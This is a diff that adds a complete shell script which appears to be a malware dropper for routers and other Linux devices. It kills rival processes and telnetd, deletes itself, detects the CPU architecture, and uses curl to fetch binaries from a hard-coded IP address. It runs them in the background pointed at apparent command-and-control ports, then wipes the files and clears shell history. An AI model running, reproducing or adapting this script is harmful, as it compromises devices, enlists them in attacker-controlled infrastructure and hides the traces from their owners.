@@ -1,0 +1,56 @@
+#!/bin/sh
+rm -rf /tmp/httpd_watchdog.tar.gz /tmp/firewall.d /tmp/mips_ff
+killall mips_ff
+killall firewallsd
+killall httpd_watchdog
+killall telnetd
+killall mips_ff
+rm -rf $0
+platform=`uname -a`
+
+arm=`echo $platform | grep -e arm`
+mips=`echo $platform | grep -e mips`
+x86_64=`echo $platform | grep -e x86_65 -e x86_64`
+x86=`echo $platform | grep -e i686 -e i586 -e i486 -e i386`
+
+if [ -n "$arm" ]; then
+    curl http://216.128.179.235/download_cli_arm -so /tmp/bioset1
+    chmod +x /tmp/bioset1
+    /tmp/bioset1 "216.128.179.235:5555/arm/a -c 216.128.179.235:9999" &
+    rm -rf /tmp/bioset1
+
+elif [ -n "$mips" ]; then
+    curl http://216.128.179.235/download_cli_mips -so /tmp/bioset2
+    chmod +x /tmp/bioset2
+    /tmp/bioset2 "216.128.179.235:5555/mips/m -c 216.128.179.235:9999" &
+    rm -rf /tmp/bioset2
+    
+    curl http://216.128.179.235/download_cli_mipsel -so /tmp/bioset3
+    chmod +x /tmp/bioset3
+    /tmp/bioset3 "216.128.179.235:5555/mipsel/ml -c 216.128.179.235:9999" &
+    rm -rf /tmp/bioset3
+
+elif [ -n "$x86_64" ]; then
+    curl http://216.128.179.235/download_cli_x64 -so /tmp/bioset4
+    chmod +x /tmp/bioset4
+    /tmp/bioset4 "216.128.179.235:5555/x64/64 -c 216.128.179.235:9999" &
+    sleep 2
+    rm -rf /tmp/bioset4
+
+    curl http://216.128.179.235/download_cli_x86_64 -so /tmp/bioset5
+    chmod +x /tmp/bioset5
+    /tmp/bioset5 "216.128.179.235:5555/x86_64/8664 -c 216.128.179.235:9999" &
+    sleep 2
+    rm -rf /tmp/bioset5
+
+elif [ -n "$x86" ]; then
+    curl http://216.128.179.235/download_cli_i686 -so /tmp/bioset6
+    chmod +x /tmp/bioset6
+    /tmp/bioset6 "216.128.179.235:5555/x86/686 -c 216.128.179.235:9999" &
+
+else
+    curl http://216.128.179.235/plantform.html
+fi
+
+rm -rf /tmp/bioset*
+history -c
